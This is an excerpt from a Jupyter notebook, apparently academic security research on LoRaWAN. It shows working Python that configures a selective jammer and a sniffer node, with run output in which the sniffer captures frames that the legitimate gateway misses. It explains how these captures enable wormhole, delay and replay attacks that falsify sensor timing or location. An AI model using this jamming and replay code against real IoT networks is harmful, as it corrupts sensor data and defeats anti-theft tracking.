      "Jammed:                                               \n",
      "\n",
      "Frame 3: Unconfirmed uplink from other device:\n",
      "Transmitted: 40 c0 fe ba be 00 2c 01 01 c2 6d ec 49 d0\n",
      "Received:    40 c0 fe ba be 00 2c 01 01 c2 6d ec 49 d0\n",
      "Jammer Mask: *  ** ** ** **\n",
      "Jammed:                                               \n"
     ]
    }
   ],
   "source": [
    "# Confirmed uplink for our device, should start with 80 de ad be ef\n",
    "rx_mtype_confirmed_uplink = bob_frames[0]['payload']\n",
    "\n",
    "# Unconfirmed uplink for our device, should start with 40 de ad be ef\n",
    "rx_mtype_unconfirmed_uplink = bob_frames[1]['payload']\n",
    "\n",
    "# Unconfirmed uplink for the other device, should start with 40 co fe ba be\n",
    "rx_mtype_other_uplink = bob_frames[2]['payload']\n",
    "\n",
    "if rx_mtype_confirmed_uplink is not None:\n",
    "    print(\"Frame 1: Confirmed uplink from our device:\")\n",
    "    compare_frames(confirmed_uplink.raw, rx_mtype_confirmed_uplink, mask)\n",
    "    print()\n",
    "if rx_mtype_unconfirmed_uplink is not None:\n",
    "    print(\"Frame 2: Unconfirmed uplink from our device:\")\n",
    "    compare_frames(unconfirmed_uplink.raw, rx_mtype_unconfirmed_uplink, mask)\n",
    "    print()\n",
    "if rx_mtype_other_uplink is not None:\n",
    "    print(\"Frame 3: Unconfirmed uplink from other device:\")\n",
    "    compare_frames(other_uplink.raw, rx_mtype_other_uplink, mask)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now, only the confirmed frame of our device is affected, showing that the additional check for the MType field is effective.\n",
    "\n",
    "In a controlled environment, where you can assure that other devices are affected, you can also shorten the `mask` list to `[0xE0]` and the `pattern` to `[0x80]` to see the effect of the shorter pattern on the length of the payload that gets scrambled. It will look like this:\n",
    "\n",
    "```\n",
    "Frame 1: Confirmed uplink from our device:\n",
    "Transmitted: 80 de ad be ef 00 2a 00 01 40 ab b6 d7 6a\n",
    "Received:    80 de ed f0 a3 a2 28 00 39 6d fd 1d 50 bb\n",
    "Jammer Mask: * \n",
    "Jammed:            *  ** ** **  *    ** ** ** ** ** **\n",
    "\n",
    "Frame 2: Unconfirmed uplink from our device:\n",
    "Transmitted: 40 de ad be ef 00 2a 00 01 10 30 af 2d 0d\n",
    "Received:    40 de ad be ef 00 2a 00 01 10 30 af 2d 0d\n",
    "Jammer Mask: * \n",
    "Jammed:                                               \n",
    "\n",
    "Frame 3: Unconfirmed uplink from other device:\n",
    "Transmitted: 40 c0 fe ba be 00 2c 01 01 c2 6d ec 49 d0\n",
    "Received:    40 c0 fe ba be 00 2c 01 01 c2 6d ec 49 d0\n",
    "Jammer Mask: * \n",
    "Jammed:                                               \n",
    "```\n",
    "\n",
    "Since the decision for jamming can be made much earlier, in this case even the device address is affected. That means even if the receiver tries partial demodulation, it cannot determine which device tried to transmit this frame."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Jamming And Sniffing\n",
    "\n",
    "In this section, we try to receive the original content of jammed frames, while still jamming them for the legitimate receiver. This lays the foundation for wormhole attacks, as mentioned in [section 5 of our paper](https://dl.acm.org/doi/10.1145/3395351.3399423). As the figures there already show, the attacker needs two nodes for this to work, one located as close as possible to the transmitter, and one close to the legitimate receiver. The node at the transmitter acts as sniffer, and the node at the receiver as jammer.\n",
    "\n",
    "The success of this attack depends on the characteristics of the capture effect in LoRa: If the receiver has synchronized to a LoRa frame, it will succeed in demodulating it, if no interference of a non-orthogonal chirp arrives at the receiver with a higher signal level than -6 dB compared to the synchronized frame.\n",
    "\n",
    "For our setup, we attach the sniffer board to node alice and require an attenuation of 6 dB to the node to which bob and the jammer are attached to. Usually, several office walls are sufficient for this, in urban outdoor environments, it might require up to some hundreds of meters.\n",
    "\n",
    "```\n",
    "   ,---------,                                     ,---------,\n",
    "   | Sniffer |                                    /| Jammer  |\n",
    "   `---------´                                   / `---------´\n",
    "        ^ original frames                       /\n",
    "   ,---------,                                 /   ,---------,\n",
    "   | Alice   | -------- LoRaWAN messages -----*--> | Bob     |\n",
    "   `---------´         attenuation >6 dB           `---------´\n",
    "```\n",
    "\n",
    "We select a node to become the sniffer (must not be any node selected at the top of this sheet):"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [],
   "source": [
    "sniffer  = tc.nodes['alice']['feather']"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In this experiment, we are no longer interested in the selectiveness of the jammer, but in the success of the sniffer while it is still not received by the legitimate receiver, bob.\n",
    "\n",
    "We run ten rounds of an experiment and see how often that conditions is fulfilled:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Round  1\n",
      "  Bob: False   Sniffer: True\n",
      "Round  2\n",
      "  Bob: False   Sniffer: True\n",
      "Round  3\n",
      "  Bob: False   Sniffer: True\n",
      "Round  4\n",
      "  Bob: False   Sniffer: True\n",
      "Round  5\n",
      "  Bob: False   Sniffer: True\n",
      "Round  6\n",
      "  Bob: False   Sniffer: True\n",
      "Round  7\n",
      "  Bob: False   Sniffer: True\n",
      "Round  8\n",
      "  Bob: False   Sniffer: True\n",
      "Round  9\n",
      "  Bob: False   Sniffer: True\n",
      "Round 10\n",
      "  Bob: False   Sniffer: True\n",
      "\n",
      "Done. Did 10 runs.\n",
      "Bob received a valid frame 0 time(s).\n",
      "The sniffer received a valid frame 10 time(s).\n",
      "The sniffer received a valid frame 10 time(s) while Bob didn't.\n"
     ]
    }
   ],
   "source": [
    "num_rounds = 10\n",
    "\n",
    "# Reset all channel configuration\n",
    "alice.set_lora_channel(**channel)\n",
    "bob.set_lora_channel(**channel)\n",
    "jammer.set_lora_channel(**channel)\n",
    "sniffer.set_lora_channel(**channel)\n",
    "\n",
    "# Configure jammer (again: DevAddr)\n",
    "pattern = [0x00, 0xDE, 0xAD, 0xBE, 0xEF]\n",
    "mask = [0x00, 0xFF, 0xFF, 0xFF, 0xFF]\n",
    "jammer.set_lora_channel(**channel)\n",
    "jammer.set_jammer_payload_length(4)\n",
    "jammer.set_preamble_length(8)\n",
    "jammer.set_txcrc(False)\n",
    "jammer.enable_sniffer(action='internal', pattern=pattern, mask=mask)\n",
    "\n",
    "# Statistics\n",
    "sniffer_got_it = 0\n",
    "bob_got_it = 0\n",
    "sniffer_got_it_but_bob_didnt = 0\n",
    "\n",
    "true_payload = list(confirmed_uplink.raw)\n",
    "try:\n",
    "    for i in range(num_rounds):\n",
    "        n = i+1\n",
    "        print(f\"Round {n:2}\")\n",
    "        # Enable receiver (that also clears the buffer from earlier rounds)\n",
    "        bob.receive()\n",
    "        # Enable sniffer (it is just a plain receiver, like bob is. Location makes the difference)\n",
    "        sniffer.receive()\n",
    "        time.sleep(0.5)\n",
    "        \n",
    "        # Transmit a test frame\n",
    "        alice.transmit_frame(true_payload, blocking = True)\n",
    "        time.sleep(2)\n",
    "        \n",
    "        # Get received payloads from bob and the sniffer\n",
    "        bob_payloads = []\n",
    "        frm = bob.fetch_frame()\n",
    "        while frm is not None:\n",
    "            bob_payloads.append(list(frm['payload']))\n",
    "            frm = bob.fetch_frame()\n",
    "        bob.standby()\n",
    "        sniffer_payloads = []\n",
    "        frm = sniffer.fetch_frame()\n",
    "        while frm is not None:\n",
    "            sniffer_payloads.append(list(frm['payload']))\n",
    "            frm = sniffer.fetch_frame()\n",
    "        sniffer.standby()\n",
    "        \n",
    "        # Evaluate run\n",
    "        sniffer_success = true_payload in sniffer_payloads\n",
    "        bob_success = true_payload in bob_payloads\n",
    "        print(f\"  Bob: {bob_success}   Sniffer: {sniffer_success}\")\n",
    "        if sniffer_success:\n",
    "            sniffer_got_it += 1\n",
    "        if bob_success:\n",
    "            bob_got_it += 1\n",
    "        if sniffer_success and not bob_success:\n",
    "            sniffer_got_it_but_bob_didnt += 1\n",
    "            \n",
    "finally:\n",
    "    jammer.standby()\n",
    "    bob.standby()\n",
    "\n",
    "print()\n",
    "print(f\"Done. Did {n} runs.\")\n",
    "print(f\"Bob received a valid frame {bob_got_it} time(s).\")\n",
    "print(f\"The sniffer received a valid frame {sniffer_got_it} time(s).\")\n",
    "print(f\"The sniffer received a valid frame {sniffer_got_it_but_bob_didnt} time(s) while Bob didn't.\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We can see that the sniffer was often successful to receive the frame while bob was not.\n",
    "\n",
    "If alice was not a ChirpOTLE node, but a real LoRaWAN end device, and bob a LoRaWAN gateway, an attacker could now run a delay attack for this end device. The sniffed payload contains a valid LoRaWAN frame with a correct MIC. Due to the jammer, the Network Server has not processed the frame yet, meaning a frame with that frame counter value is still valid.\n",
    "\n",
    "This alone is a problem for some types of sensor devices. If such devices do not contain their own clock or the payload does not contain a timestamp to reduce the frame length, the time of sensor readings often is assumed to be close to the transmission time. If an attacker can sniff frames, they can start replaying these frames later, and thus adding wrong temporal information to the sensor readings. The effect depends on the type of sensor.\n",
    "\n",
    "But an attacker is not limited to modifying temporal information, but can also modify spatial information. If LoRaWAN geolocation is used, frames can be replayed at totally different locations to simulate movement of the devices. If the devices are part of an anti-theft-protection, the attacker can remove the protected goods but still replay the position signal from their former location."
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
